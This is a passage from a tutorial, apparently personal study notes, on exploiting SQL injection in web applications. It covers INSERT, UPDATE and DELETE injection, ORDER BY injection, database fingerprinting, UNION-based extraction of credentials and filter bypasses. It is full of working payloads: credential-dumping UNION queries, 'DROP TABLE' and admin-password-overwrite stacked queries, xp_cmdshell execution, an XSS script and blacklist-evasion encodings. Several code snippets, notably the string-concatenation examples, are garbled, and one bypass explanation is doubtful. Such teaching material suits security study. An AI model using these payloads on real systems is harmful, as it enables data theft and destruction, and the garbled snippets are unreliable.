While the ```WHERE``` clause is the most common entry point for injection, vulnerabilities can sometimes exist in other parts of a ```SELECT``` query. These include:

- ```ORDER BY``` Clause: Attackers may inject arbitrary column names or expressions to modify sorting behavior, potentially leading to data leaks or even errors that expose database structure.

- Table and Column Names: If dynamic SQL is used improperly, an attacker could manipulate table or column names to access unauthorized data.

#### INSERT Statements:

```INSERT``` statements are used to add a new row of data to a table. They are commonly employed for creating new user accounts, logging events in an audit log, or placing orders.

For example, an application that allows user self-registration might insert a new record into the ```users``` table like this:

```
INSERT INTO users (username, password, ID, privs) VALUES ('daf', 'secret', 2248, 1)  
```

If the ```username``` or ```password``` field is vulnerable to SQL injection, an attacker can supply arbitrary values for ```ID``` and ```privs```. However, the attacker must complete the rest of the ```VALUES``` clause with the correct number of data items and appropriate data types.

For instance, injecting into the ```username``` field, an attacker could supply the following:

```
foo', 'bar', 9999, 0)--  
```

This creates an account with an ID of ```9999``` and ```privs``` of ```0```. If the ```privs``` field is used to determine account privileges, the attacker may be able to create an administrative or privileged user.

Sometimes, an attacker can use injection to extract information even if no errors are shown. For example, an attacker could insert the database’s version string into a field within their user profile. This version string might later be displayed on their profile page, allowing the attacker to view it.

When injecting into an ```INSERT``` statement, you may not know how many fields are required or their data types. You can try injecting increasingly complex payloads until the statement executes successfully:

```
foo')  
foo', 1)--  
foo', 1, 1)--  
foo', 1, 1, 1)--  
```

Since many databases can implicitly cast integers to strings, using integers like ```1``` or ```2``` may help complete the injection if the fields are text-based.

If values like ```1``` or ```l``` are rejected, you can try supplying ```2000```. Some databases interpret this value as a date and implicitly cast it to match the required type. This can help you bypass type-based rejections.

Once you identify the correct number of fields, you can use additional SQL injection techniques:

- On MS-SQL: You can append a second query and use inference-based techniques (discussed later) to extract more data.

- On Oracle: You can embed a ```SELECT``` subquery within the ```INSERT``` query. This subquery can be used to influence the success or failure of the entire statement, leveraging inference techniques to gather information.

#### UPDATE Statements:

```UPDATE``` statements are used to modify existing rows of data in a table. They’re commonly employed when users change existing data — for instance, updating contact information, resetting passwords, or changing an item quantity in an order.

A typical ```UPDATE``` statement functions similarly to an ```INSERT``` statement but usually includes a ```WHERE``` clause to specify which rows to modify. For example, if a user changes their password, the application might execute the following query:

```
UPDATE users SET password = 'newsecret' WHERE user = 'marcus' AND password = 'secret'  
```

This checks the user’s current password and, if it matches, updates it with the new value.

If vulnerable to SQL injection, attackers can bypass the password check entirely by injecting the following input into the ```username``` field:

```
admin'--  
```

This causes the query to ignore everything after ```--```, effectively bypassing the check and updating the ```admin``` password without needing the original password.

Injecting conditions like ```1=1``` can be even more catastrophic. For example, supplying this username:

```
admin' OR 1=1--  
```

Would generate the following query:

```
UPDATE users SET password = 'newsecret' WHERE user = 'admin' OR 1=1  
```

Since ```1=1``` always evaluates as true, this query updates *every user’s password* to ```newsecret```!

Sometimes SQL injection vulnerabilities are hidden in unexpected places. Even if a function doesn’t seem to update data (e.g., logging in), some applications perform hidden ```UPDATE``` queries after login to update metadata like “last login time” or other user profile information. If these queries use the same vulnerable ```username``` parameter without sanitization, they can lead to massive data corruption. For example, a successful injection during login could trigger subsequent update statements for every user’s profile, causing widespread damage.

#### DELETE Statements:

```DELETE``` statements are used to remove rows from a table. Common examples include users removing items from a shopping cart or deleting a saved address from their profile.

Like ```UPDATE``` statements, ```DELETE``` queries typically rely on a ```WHERE``` clause to specify which rows to remove. User-supplied input is often incorporated into this clause, making it a prime target for SQL injection. For example, a query like this might delete a user’s address:

```
DELETE FROM addresses WHERE user = 'marcus' AND address_id = 42  
```

If an attacker injects this payload into the ```user``` field:

```
' OR 1=1--  
```

The resulting query becomes:

```
DELETE FROM addresses WHERE user = '' OR 1=1--  
```

Since ```1=1``` is always true, this will delete every row in the ```addresses``` table!

### Finding SQL Injection Bugs:

SQL injection vulnerabilities can sometimes be identified with a single unexpected input, but in many cases, they are subtle and difficult to distinguish from other vulnerabilities or harmless anomalies. To reliably uncover most SQL injection flaws, follow a systematic approach.

During application mapping, you should identify all areas where the application interacts with a back-end database. Every data input that reaches the server needs to be tested for potential SQL injection, even if it isn’t obvious. This includes:

- URL parameters

- cookies

- POST data

- HTTP headers

It’s crucial to test both the *name* and *value* of each parameter. For instance, ```username``` or ```password``` fields could be vulnerable in their labels, not just the input values.

When probing multistage processes, ensure you complete all steps before reviewing the application's response. Some applications store data temporarily across several steps and only write to the database after all inputs are collected. Failing to test entire sequences can lead to missing hidden vulnerabilities.

#### Injecting into String Data:

When user-supplied string data is included in a SQL query, it is enclosed within single quotation marks. To exploit an SQL injection flaw, the goal is to break out of these quotation marks and manipulate the query.

A common first step is submitting a single quote (```'```) as input to see if it triggers an error or unexpected behavior. If a database error appears, consult the SQL Syntax and Error Reference to determine its significance.

**Example 1: Basic Injection Test**

If a login form executes the following SQL query:

```
SELECT * FROM users WHERE username = 'input' AND password = 'password';
```

Submitting a single quote (```'```) as the username would break the query:

```
SELECT * FROM users WHERE username = ''' AND password = 'password';
```

This results in a syntax error, revealing a possible vulnerability.

To confirm, submit two single quotes (```''```) instead. Databases use this as an escape sequence to represent a literal single quote within the string rather than closing it. If the error disappears when using ```''```, the input is likely being processed in an unsafe manner, indicating SQL injection.

**Example 2: String Concatenation Test**

Another way to verify the vulnerability is by using string concatenation operators specific to different databases. By crafting input that resolves to a known value, we can observe how the application handles it:

![database concatenation](https://raw.githubusercontent.com/PurityControl7/cookbooks/refs/heads/root/MISCELLANEOUS/database_concatenation.png)

If the application processes these inputs the same way it does a normal ```"foo"```, it strongly suggests that user input is being directly inserted into SQL queries.

**Wildcard Character for Database Interaction:**

To test whether an application is interacting with a database, you can submit the SQL wildcard character (```%```) in a search field.

For example, searching for ```%``` in a product search might return an unusually large number of results, suggesting that the input is being directly used in a SQL ```LIKE``` query:

```
SELECT * FROM products WHERE name LIKE '%input%';
```

While this does not confirm a vulnerability, it indicates that further testing is warranted.

**Unexpected JavaScript Errors:**

While testing with a single quote, watch for JavaScript errors in your browser’s developer console. If the application improperly handles input, your single quote may be reflected in JavaScript, breaking its syntax.

For example, an input like this:

```
var user = 'input';
```

Could become:

```
var user = ''';
```

This causes a JavaScript error, which may expose a cross-site scripting (XSS) vulnerability in addition to SQL injection. If an attacker submits input like this in a vulnerable search field or profile name field:

```
'"><script>alert('XSS')</script>
```

And the application stores this value in the database without proper encoding, the next time the page renders, the script will execute in the browser of any user who loads the affected content.

#### Injecting into Numeric Data:

When user-supplied numeric data is incorporated into a SQL query, the application may still handle this as string data by encapsulating it within single quotation marks. Therefore, you should always follow the steps described previously for string data. However, in most cases, numeric data is passed directly to the database in numeric form and is not enclosed within quotation marks. If none of the previous string-based tests point to a vulnerability, you can take additional steps specifically for numeric data.

**Testing for SQL Injection in Numeric Data:**

One way to test for SQL injection in numeric parameters is by supplying a simple mathematical expression equivalent to the original numeric value. For example, if the original value is ```2```, try submitting ```1+1``` or ```3-1```. If the application processes the input and returns the expected result, this indicates that the database is evaluating the expression, which suggests a potential SQL injection vulnerability. Example:

If a URL contains a parameter like this:

```
https://example.com/page.php?id=2
```

Try modifying it to:

```
https://example.com/page.php?id=1+1
```

If the application still returns the page corresponding to ```id=2```, it is likely that the database is evaluating the arithmetic expression, signaling a possible SQL injection flaw.

This test is most reliable when the modified parameter has a noticeable effect on the application's behavior. For example, if a ```PageID``` parameter controls which content is displayed, then replacing ```2``` with ```1+1``` and observing no change suggests SQL injection is possible. However, if arbitrary input does not alter the application's behavior, this test alone is inconclusive.

**Using SQL-Specific Functions to Confirm Injection:**

If the first test is successful, you can gather further evidence by using SQL functions. A useful method is to employ functions like ```ASCII()```, which returns the ASCII code of a character. This can help determine if the input is being processed by the database. For example, because the ASCII value of 'A' is 65, the following expression should be equivalent to ```2```:

```
67 - ASCII('A')
```

If the application processes this input correctly, it suggests that SQL injection is possible. However, this method may not work if single quotes are filtered. In such cases, databases often implicitly convert numeric data to string data when required. Since the ASCII value of the character ```'1'``` is 49, the following expression is also equivalent to ```2```:

```
51 - ASCII(1)
```

If this input produces the expected result, it further confirms that the application is vulnerable to SQL injection.

**Handling Special Characters in HTTP Requests:**

When testing for SQL injection, it's crucial to remember that certain characters have special meanings in HTTP requests. If you need to include these characters in your payloads, you must URL-encode them to ensure they are processed correctly. Below are some key encoding considerations:

- ```&``` and ```=``` are used to join name/value pairs in the query string and must be encoded as ```%26``` and ```%3D```, respectively.

- Literal spaces are not allowed in the query string. Encode them using ```+``` or ```%20```.

- Since ```+``` represents a space in URLs, an actual ```+``` must be encoded as ```%2B```.

- The semicolon (```;```) separates cookie fields and should be encoded as ```%3B```.

Proper encoding is necessary whether you are modifying parameters directly in a browser, using an intercepting proxy like Burp Suite, or any other method. Failing to encode special characters correctly may cause the entire request to be invalid or interpreted in an unintended way.

The methods outlined above can detect many SQL injection vulnerabilities, including those that do not return useful errors. However, some cases require more advanced techniques. One such method is using *time-based delays* to confirm a vulnerability when there is no direct feedback from the database. These techniques will be covered in more detail later in this chapter.

#### Injecting into the Query Structure:

If user-supplied data is inserted into the structure of an SQL query itself—rather than as a value encapsulated within quotes—then exploiting SQL injection involves directly supplying valid SQL syntax. No escaping is required to break out of a data context, making this type of injection highly potent.

One of the most common injection points within SQL query structure is the ```ORDER BY``` clause. The ```ORDER BY``` keyword sorts the result set based on a specified column name or column index number. Many applications allow users to sort results dynamically, unknowingly introducing an injection vector.

Consider the following example of a query for retrieving a list of books:

```
SELECT author, title, year FROM books WHERE publisher = 'Wiley' ORDER BY title ASC;
```

If the ```title``` column in the ```ORDER BY``` clause is user-controlled, an attacker does not need to use quotes or escape characters, as their input directly modifies the query’s structure.

**Example Exploit:**

A malicious user could manipulate the sorting behavior by injecting additional SQL code, such as:

```
?sort=year DESC, (SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END)--
```

Additional notes:

- *The ```ORDER BY``` clause supports multiple columns, separated by commas.*

- *Normally, the sorting order is determined by a column name (e.g., ```ORDER BY year DESC```), but here we inject a subquery:*

```
(SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END)
```

- *```CASE WHEN (1=1) THEN 1 ELSE 2 END``` always evaluates to ```1```, because ```1=1``` is always true.*

- *The second column in the ```ORDER BY``` clause is now an injected expression rather than a real column. This can be useful for inference attacks or debugging responses from the database (e.g., seeing how it reacts when the sorting field is manipulated).*

- *You could modify the condition inside ```CASE``` to test for logical behaviors, such as checking for the existence of specific values in the database. This technique could also help infer Boolean conditions in blind SQL injection scenarios.*

Overall, this could be used to infer information about the database by modifying the sorting order and observing the changes in output. Additionally, an attacker could attempt something like:

```
?sort=(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)
```

Additional notes:

- *The ```information_schema.columns``` table contains metadata about database columns.*

- *This query attempts to retrieve the **first** column name from the ```users``` table.*

- *```LIMIT 1``` ensures that only a single result is returned (useful if you don’t want to flood the response with all column names).*

*How ```LIMIT``` Works:*

- *```LIMIT X``` restricts the number of results.*

- *```LIMIT 1``` → Return only the first row.*

- *```LIMIT 5``` → Return the first 5 rows.*

- *```LIMIT 5, 10``` → Skip the first 5 results and return the next 10. By adjusting ```LIMIT```, an attacker can enumerate column names one by one.*

This would return column names from the ```users``` table, which can be valuable for further attacks.

**Alternative Injection Points:**

Some applications allow users to specify a column name in the ```WHERE``` clause. Since column names are not encapsulated in single quotes, they present a similar risk. For example:

```
SELECT * FROM users WHERE $column = 'admin';
```

Additional notes:

- *If an attacker has access to this query, they might assume that the database stores plaintext passwords. However, in reality, modern databases store hashed passwords (e.g., MD5, SHA256, bcrypt).*

- *If ```password = 'admin'``` is actually storing a hash, then this query would return the hash of "admin" (e.g., ```21232f297a57a5a743894a0e4a801fc3``` for MD5).*

If ```$column``` is user-controlled, an attacker could supply:

```
?column=password --
```

which modifies the query to:

```
SELECT * FROM users WHERE password = 'admin';
```

**Identifying ORDER BY Injection:**

Detecting this form of SQL injection requires methodical testing:

1. Numbered Input: Supply numbers starting from 1 and incrementing:

- If changing ```1``` to ```2``` modifies the result order, the parameter likely controls an ```ORDER BY``` clause.

- If supplying an excessively high number (e.g., ```999```) triggers an error, the number of columns in the query can be inferred.

2. Sorting Injection Test: Attempt to manipulate the sorting direction:

```
1 ASC --
1 DESC --
```

If results change as expected, this confirms control over the sorting mechanism.

3. Injecting Expressions: Instead of a column name, supply an expression:

```
?sort=(SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END)
```

Additional notes:

- *```CASE WHEN (1=1) THEN 1 ELSE 2 END``` is a Boolean evaluation technique. The condition always returns 1, meaning the query behaves consistently regardless of data.*

- *If this were part of a blind SQL injection test, an attacker could replace ```1=1``` with conditions such as:*

```
CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin') > 0 THEN 1 ELSE 2 END
```

- *This would return ```1``` if an ```admin``` user exists, allowing inference-based enumeration.*

If the query executes successfully, further SQL injection is possible.

**Advanced Exploitation:**

Unlike standard SQL injection points, ```ORDER BY``` clauses do not allow ```UNION```, ```WHERE```, ```OR```, or ```AND``` keywords. Instead, attackers may exploit nested queries:

```
(SELECT 1 WHERE (SELECT COUNT(*) FROM users) > 0)
```

Additional notes:

- *This is a **nested query** that checks if the users table contains any records.*

- *```SELECT COUNT(*) FROM users``` returns the number of rows in the users table. If the count is greater than ```0```, the outer ```SELECT 1``` executes successfully. If there are no users, the query fails (no result is returned). This technique can be used in blind SQL injection to determine if a table has any records before extracting further data.*

For databases that support batched queries (such as MS-SQL), attackers can leverage stacked queries:

```
1; DROP TABLE users --
```

Additional notes:

- *Stacked queries allow multiple SQL statements to be executed in sequence using a semicolon (```;```). This is how it works:*

```
1;   -- First query executes successfully
DROP TABLE users;   -- Second query executes, deleting the table
--   -- Commenting out anything after to avoid syntax errors
```

- *If the database allows multiple statements in a single query execution, an attacker can inject destructive commands. ```DROP TABLE``` removes an entire table, which can wipe out user data. Variations include:*

```
1; UPDATE users SET password='hacked' WHERE username='admin' --
```

- *This would overwrite the admin’s password. Stacked queries are dangerous and should be prevented by disabling multiple statements in queries (```mysqli_multi_query``` in PHP).*

However, successful exploitation often requires inference-based techniques, such as triggering errors or observing sorting behaviors.

**Bypassing Defenses:**

- Prepared Statements: While effective against many SQL injection vectors, they are not always implemented for ```ORDER BY``` inputs.

- Filtering & Whitelisting: Applications should only allow predefined column names and sort directions (e.g., ```ASC```, ```DESC```).

- Fuzzing & Wordlists: To identify these vulnerabilities manually, use wordlists containing common column names (e.g., ```id```, ```name```, ```email```, ```password```) and sorting options.

By recognizing and exploiting structural SQL injection vulnerabilities, attackers can bypass traditional defenses and manipulate query execution in unexpected ways.

### Fingerprinting the Database:

Most of the techniques described so far work across common database platforms with minor syntax adjustments. However, as we move into more advanced exploitation techniques, the differences between databases become more pronounced. Identifying the back-end database type is crucial for crafting effective attacks.

One common method of fingerprinting a database is by extracting its version string. If direct extraction isn't possible, alternative methods can be used. One of the most reliable involves examining how different databases concatenate strings. By injecting a specific string and then testing different concatenation techniques, we can deduce the database type based on which method successfully reconstructs the expected output.

**String Concatenation Methods by Database:**

- Oracle: ```'serv 1 || 'ices'``` (uses ```||``` for concatenation)

- MS-SQL: ```'serv' + 'ices'``` (uses ```+``` for concatenation)

- MySQL: ```1 serv 1 1 ices 1``` (uses spaces for implicit concatenation)

If injecting into a numeric field, the following expressions evaluate to ```0``` on their respective databases but generate errors on others, allowing for reliable fingerprinting:

- Oracle: ```bitand(1, 1) - bitand(1, 1)```

- MS-SQL: ```@@PACK_RECEIVED - @@PACK_RECEIVED```

- MySQL: ```CONNECTION_ID() - CONNECTION_ID()```

Note: Microsoft SQL Server (MS-SQL) and Sybase share a common origin. As a result, many attack techniques applicable to MS-SQL also work against Sybase with minimal modification.

#### MySQL-Specific Fingerprinting via Comments:

MySQL offers a unique method for database version detection through inline comments. If a comment begins with an exclamation mark (```!```) followed by a version number, MySQL interprets the enclosed SQL statement only if the database version is equal to or higher than the specified value. Otherwise, the contents are ignored as a standard comment.

This behavior can be leveraged for precise fingerprinting of MySQL versions. For example, injecting the following string into a query causes the ```WHERE``` clause to always be false if the MySQL version in use is 3.23.02 or later:

```
/*!32302 and 1=0*/
```

For example:

```
SELECT * FROM users WHERE username = 'admin' /*!32302 and 1=0*/;
```

Additional notes:

- *If the MySQL version is 3.23.02 or later, the comment will be interpreted as SQL, making the condition ```AND 1=0``` active.*

- *```AND 1=0``` always evaluates to ```FALSE```, meaning no results will be returned.*

- *If the MySQL version is earlier than 3.23.02, the ```/*!32302 and 1=0*/``` part is treated as a comment and ignored, effectively making the query:*

```
SELECT * FROM users WHERE username = 'admin';
```

*This would return user details if an "admin" user exists.*

In short, this approach allows attackers to conditionally execute SQL payloads based on the database version, much like C preprocessor directives. By leveraging these fingerprinting techniques, attackers can refine their approach to SQL injection and tailor exploits based on the specific database in use.

Note:

*C preprocessor directives are instructions that get **processed before actual compilation**. They are typically used to include files, define macros, conditionally compile code, and set compilation settings. These directives start with ```#``` and are handled by the C preprocessor, not the compiler itself. Some common examples are:*

- *```#include <stdio.h>``` → Includes a standard library.*

- *```#define MAX 100``` → Defines a constant.*

- *```#if```, ```#ifdef```, ```#ifndef```, ```#else```, ```#endif``` → Conditional compilation.*

*These directives help in writing modular, portable, and optimized code by enabling conditional compilation based on system architecture, debugging flags, or feature toggles.*

### The UNION Operator in SQL Injection Attacks:

The ```UNION``` operator in SQL is used to combine the results of two or more ```SELECT``` statements into a single result set. When a web application contains a SQL injection vulnerability within a ```SELECT``` statement, an attacker can use the ```UNION``` operator to append additional query results, often extracting sensitive data from the database. If the results are displayed in the application's response, this method becomes a powerful tool for data exfiltration. The ```UNION``` operator is supported by all major database management systems (DBMS) and is one of the fastest ways to retrieve arbitrary information when query results are directly returned to the user.

Consider a web application that allows users to search for books based on the publisher's name. The application constructs the following query:

```
SELECT author, title, year FROM books WHERE publisher = 'Wiley';
```

Assume that this query returns the following results:

![UNION example](https://raw.githubusercontent.com/PurityControl7/cookbooks/refs/heads/root/MISCELLANEOUS/union-example.png)

An attacker can manipulate the query using the ```UNION``` operator to inject a second query and extract data from a different table. For instance, supplying the following input:

```
Wiley' UNION SELECT username, password, uid FROM users--
```

Causes the application to execute:

```
SELECT author, title, year FROM books WHERE publisher = 'Wiley'
UNION SELECT username, password, uid FROM users--';
```

If successful, this query appends user credentials from the ```users``` table to the results:

![UNION example 2](https://raw.githubusercontent.com/PurityControl7/cookbooks/refs/heads/root/MISCELLANEOUS/union-example2.png)

Since the web application does not distinguish between different data sources, it simply displays the injected results as part of the book list.

#### Key Constraints of UNION-Based SQL Injection:

Before successfully leveraging the ```UNION``` operator in an attack, two critical constraints must be satisfied:

1. **The number of columns in both queries must match.** If the original query returns three columns, the injected query must also return exactly three columns.

Incorrect example:

```
Wiley' UNION SELECT username, password FROM users--
```

This fails because the original query has three columns, while the injected query only returns two, triggering an error such as:

```
ORA-01789: query block has incorrect number of result columns
```

2. **The data types must be compatible.** Each column in the injected query must either match the data type of the corresponding column in the original query or be implicitly convertible.

Incorrect example:

```
Wiley' UNION SELECT uid, username, password FROM users--
```

If the ```year``` column in the ```books``` table is numeric and ```password``` is a string, this query will fail because databases generally cannot implicitly convert strings into numbers:

```
ORA-01790: expression must have same datatype as corresponding expression
```

Since attackers often do not know the exact structure of the original query, they may need to probe the database before successfully injecting data. Here are common techniques:

1. **Determining the number of columns using ```ORDER BY```.** The attacker can determine the number of columns by incrementing the column index in an ```ORDER BY``` clause:

```
Wiley' ORDER BY 1--  (Success)
Wiley' ORDER BY 2--  (Success)
Wiley' ORDER BY 3--  (Success)
Wiley' ORDER BY 4--  (Error!)
```

The last successful index (in this case, 3) indicates the correct number of columns.

2. **Using ```NULL``` values to bypass unknown data types.** Since ```NULL``` can be implicitly converted into any data type, the attacker can use it to avoid data type mismatches:

```
Wiley' UNION SELECT NULL, NULL, NULL--
```

If this query executes without error, the attacker can then replace the ```NULL``` values one by one with actual column values from the target table.

#### Detecting Successful Injection:

In real-world scenarios, applications may suppress error messages, making it harder to determine whether an injected query executed successfully. However, attackers can infer success by:

- Observing additional records in the response. If the number of returned results increases, the injected query likely executed.

- Using time-based or boolean-based techniques when error messages are hidden. For example:

```
Wiley' UNION SELECT '1', '2', '3' WHERE 1=1--
Wiley' UNION SELECT '1', '2', '3' WHERE 1=2--
```

If the first query returns results while the second does not, the injection is working. In other words, if an attacker submits two different UNION-based queries—one that should always return results (e.g., ```WHERE 1=1```) and another that should never return results (e.g., ```WHERE 1=2```)—and notices that only the first query returns data, it indicates that the injection worked. This means the attacker successfully manipulated the query structure and extracted additional information.

When performing a UNION-based SQL injection, your first task is to determine the number of columns returned by the original query. There are two primary methods for doing this:

**Method 1: Using ```NULL``` Values:**

Since ```NULL``` can be implicitly cast to any data type, you can systematically test different numbers of columns until the injected query executes successfully. For example:

```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

Once the query executes without errors and an additional row is returned, you have determined the required number of columns. If the application does not return database error messages, you can still infer success by examining the raw HTTP response. The injected row may contain ```NULL``` values or empty table cells, making it difficult to see in rendered HTML.

**Method 2: Using Order-Based Enumeration:**

Another approach is using the ```ORDER BY``` clause with numeric indexes to determine the number of columns. This method works by incrementing the column index until an error occurs:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

If ```ORDER BY 3``` executes without an error but ```ORDER BY 4``` throws an error, then the table has three columns.

Once you know the number of columns, the next step is to determine which of them accept string data. This is crucial because extracting meaningful information (such as usernames or passwords) typically requires a column that can store text.

To do this, inject ```NULL``` values into the columns while replacing one of them with a known string (e.g., ```'a'```):

```
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

If the response includes the letter ```a```, you have identified a column that can store strings and can now use it to extract useful data.

Unlike other databases, Oracle requires every ```SELECT``` statement to specify a ```FROM``` clause. If you try to inject:

```
' UNION SELECT NULL--
```

You will encounter an error because no table is specified. To work around this, you can select from the special ```DUAL``` table, which is an internal one-row table commonly used for evaluating expressions:

```
' UNION SELECT NULL FROM DUAL--
```

This ensures the query executes properly without requiring knowledge of specific database tables.

Once you have identified the number of columns and found one that accepts strings, you can use it to extract information. A simple proof-of-concept test is retrieving the database version. The exact query depends on the DBMS:

**MySQL and MS-SQL:**

```
' UNION SELECT @@version, NULL, NULL--
```

**Oracle:**

```
' UNION SELECT banner, NULL, NULL FROM v$version--
```

If successful, this will return information about the database version. For example, in a vulnerable book search application, the Oracle version might be displayed like this:

![UNION example 3](https://raw.githubusercontent.com/PurityControl7/cookbooks/refs/heads/root/MISCELLANEOUS/union-example3.png)

While extracting the database version can be useful for identifying vulnerabilities, your ultimate goal is to extract meaningful data such as usernames, passwords, or emails. To achieve this, you need to know the target database's table and column names.

To extract useful data from a database via SQL injection, attackers typically need to know the names of the tables and columns that contain the desired information. Major database management systems (DBMS) store metadata that can be queried to reveal this information. While the methodology remains largely the same across different databases, specific queries vary depending on the DBMS in use.

### Extracting Data with the UNION Operator:

**Step 1: Identifying the Number of Columns:**

Let's consider an attack on an MS-SQL database, though the method applies to most SQL-based systems. Suppose an address book application allows users to search for contacts by name. When a user searches for "Matthew," their browser submits the following HTTP request:

```
Name=Matthew
```

The application then returns search results, listing matching contacts. To craft a SQL injection attack, we first need to determine the number of columns in the original query. This is done by systematically appending a ```UNION SELECT``` query with different numbers of ```NULL``` values:

```
Name=Matthew' UNION SELECT NULL--
```

If this query results in an error, it means the number of columns does not match the original query’s column count. The error message typically states:

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

To resolve this, we incrementally increase the number of ```NULL``` values until no error occurs:

```
Name=Matthew' UNION SELECT NULL, NULL--
Name=Matthew' UNION SELECT NULL, NULL, NULL--
Name=Matthew' UNION SELECT NULL, NULL, NULL, NULL, NULL--
```

Once the query executes without an error and an additional row appears in the results, we have identified the correct number of columns.

**Step 2: Finding Columns with String Data Types:**

Next, we determine which columns accept string values. This is crucial because extracting meaningful data, such as usernames or passwords, requires working with string-compatible columns. We achieve this by replacing each ```NULL``` with a test string (```'a'```), one at a time:

```
Name=Matthew' UNION SELECT 'a', NULL, NULL, NULL, NULL--
```

If the application displays an additional row containing the letter ```a```, then the first column is string-compatible. If not, we repeat the process by shifting a to different columns.

**Step 3: Extracting Table and Column Names:**

To extract data from the database, we need to enumerate tables and columns. Many DBMS platforms provide system tables that store metadata about the database structure:

- MySQL, PostgreSQL, MS-SQL: ```INFORMATION_SCHEMA.COLUMNS```

- Oracle: ```ALL_TAB_COLUMNS``` (or ```USER_TAB_COLUMNS``` for the current user's tables)

- SQLite: ```sqlite_master```

For MySQL and MS-SQL, we retrieve table and column names with:

```
Name=Matthew' UNION SELECT table_name, column_name, NULL, NULL, NULL FROM information_schema.columns--
```

For Oracle, the equivalent query is:

```
Name=Matthew' UNION SELECT table_name, column_name FROM all_tab_columns--
```

To filter results for potential credentials or sensitive data, attackers might refine the search:

```
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%PASS%';
```

**Step 4: Concatenating Column Values:**

If multiple columns need to be retrieved in a single result, attackers concatenate values using DBMS-specific syntax:

- Oracle:

```
SELECT table_name || ':' || column_name FROM all_tab_columns;
```

- MS-SQL:

```
SELECT table_name + ':' + column_name FROM information_schema.columns;
```

- MySQL:

```
SELECT CONCAT(table_name, ':', column_name) FROM information_schema.columns;
```

By systematically determining the number of columns, identifying string-compatible ones, and querying system metadata, attackers can extract valuable information. Understanding this methodology is critical for both offensive security testing and defensive mitigation strategies, such as using parameterized queries and restricting database permissions.

### Bypassing Filters in SQL Injection:

In some situations, an application vulnerable to SQL injection may implement filters to prevent exploitation. These filters can block certain characters or keywords commonly used in SQL injection. While these measures can make attacks harder, they are often vulnerable to bypass techniques. Let’s dive into some ways you can bypass these filters:

1. Avoiding Blocked Characters:

If the application blocks or sanitizes certain characters—such as the single quote (```'```), which is often used to close string literals in SQL—there are still ways to perform SQL injection attacks without using these characters.

If you’re injecting into numeric fields or column names (rather than string fields), you may not need to use quotes at all. If string values are required, you can dynamically build them using their ASCII values.

For example, instead of injecting a string like ```'marcus'```, you can break it down into its individual characters and use their ASCII codes:

Oracle Example:

```
SELECT ename, sal FROM emp WHERE ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)
```

This query uses the ```CHR()``` function to inject the ASCII values of the characters in ```"marcus"```. The ASCII codes for the characters are:

- ```109``` = ```m```

- ```97``` = ```a```

- ```114``` = ```r```

- ```99``` = ```c```

- ```117``` = ```u```

- ```115``` = ```s```

This concatenates the characters to form the string ```"marcus"``` in the query.

MS-SQL Example:

```
SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
```

In MS-SQL, the ```CHAR()``` function works similarly, and you can concatenate the characters with the ```+``` operator.

2. Bypassing Blocked Comments:

In many SQL injection attacks, the ```--``` comment symbol is used to terminate the rest of the query and hide malicious code. However, some applications may block or sanitize this character. If the ```--``` symbol is blocked, there are other ways to inject code without using comments.

For example, instead of injecting:

```
' OR 1=1--
```

You might be able to inject something like:

```
OR ' a
```

Here’s the breakdown:

- The ```'``` is still used to terminate the string.

- The ```OR``` continues the logical condition.

- The ```a``` after the ```'``` is just some random character used to ensure the rest of the query doesn’t break or terminate prematurely. It’s not part of a valid SQL condition but is enough to bypass filters that block ```--``` (comments).

3. Bypassing Query Separators (Semicolons) in MS-SQL:

In some cases, you may want to inject multiple queries into a single request. In SQL, the semicolon (```;```) is used as a separator between queries. Some applications may block semicolons to prevent this type of injection.

However, in MS-SQL, you can often avoid using the semicolon by ensuring that each query is syntactically correct. This means you don’t *need* to use the semicolon to separate queries, as long as each individual query is written correctly. For example, you might inject something like:

```
SELECT user FROM users WHERE username='admin' EXEC xp_cmdshell('dir')
```

If you have the correct query structure and syntax, MS-SQL can interpret the batch without needing the semicolon to separate the two queries.

Overall, when faced with filters that block specific characters, there are plenty of ways to bypass them. You don’t always need to use single quotes, comments, or semicolons. Understanding the underlying SQL functions (like ```CHR()``` and ```CHAR()```) and how the database handles queries can open up a whole range of creative ways to inject your payloads.

#### Circumventing Simple Validation in SQL Injection:

Many web applications use input validation techniques to block malicious input, often employing simple blacklists that remove or block certain keywords or characters. However, this type of validation is often incomplete or easy to bypass, and knowing how to circumvent it can open up injection opportunities. Let’s go through some common ways to bypass input validation that relies on blacklists.

1. Bypassing Keyword Blacklisting:

If an application blocks specific SQL keywords—such as ```SELECT```—it may be using a simple blacklist approach. In these cases, you can try bypassing the blacklist by manipulating the keyword in various ways. Here are some tricks to bypass the blocking of the ```SELECT``` keyword:

- **Case manipulation:** SQL keywords are case-insensitive in most database engines. If ```SELECT``` is blocked, try using different capitalizations:

```
SeLeCt
```

- **Null byte injection:** By injecting a ```%00``` (null byte) at the start of the keyword, you may cause the application to treat the rest of the string as harmless, effectively bypassing the filter:

```
%00SELECT
```

- **Concatenating similar words:** If simple strings like ```SELECT``` are blocked, you might be able to inject something that looks like a valid SQL keyword but is syntactically different:

```
SELSELECTECT
```

- **Percent-encoded characters:** You can also use URL encoding to represent the characters in ```SELECT```. This encoding can bypass filters that block specific characters by replacing them with their ASCII hexadecimal values:

```
%53%45%4c%45%43%54
```

Here’s the breakdown of the encoding:

- ```%53``` = ```S```

- ```%45``` = ```E```

- ```%4```c = ```L```

- ```%45``` = ```E```

- ```%43``` = ```C```

- ```%54``` = ```T```

- **Double percent-encoding:** This is an even more advanced trick where you encode the percent signs themselves, making it even harder for the filter to detect the attack:

```
%2553%2545%254c%2545%2543%2554
```

In this case:

- ```%25``` represents ```%```, so ```%2553``` is actually ```%53```, which is ```S```, and so on.

Notes on Encoding Tricks:

